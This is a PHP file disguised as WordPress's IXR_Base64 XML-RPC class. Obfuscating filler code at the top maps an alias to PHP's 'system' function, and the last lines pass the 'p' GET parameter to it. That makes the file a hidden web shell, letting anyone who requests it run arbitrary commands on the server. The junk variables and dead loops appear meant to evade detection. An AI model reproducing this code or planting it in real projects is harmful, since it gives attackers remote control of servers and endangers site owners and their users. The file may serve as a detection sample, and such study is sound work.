<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * IXR_Base64
 *
 * @package IXR
 * @since 1.5.0
 */
class IXR_Base64
{
    var $data;

	/**
	 * PHP5 constructor.
	 */
    function __construct( $data )
    {
        $this->data = $data;
    }

	/**
	 * PHP4 constructor.
	 */
	public function IXR_Base64( $data ) {
		self::__construct( $data );
	}

    function getXml()
    {
        return '<base64>'.base64_encode($this->data).'</base64>';
    }
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>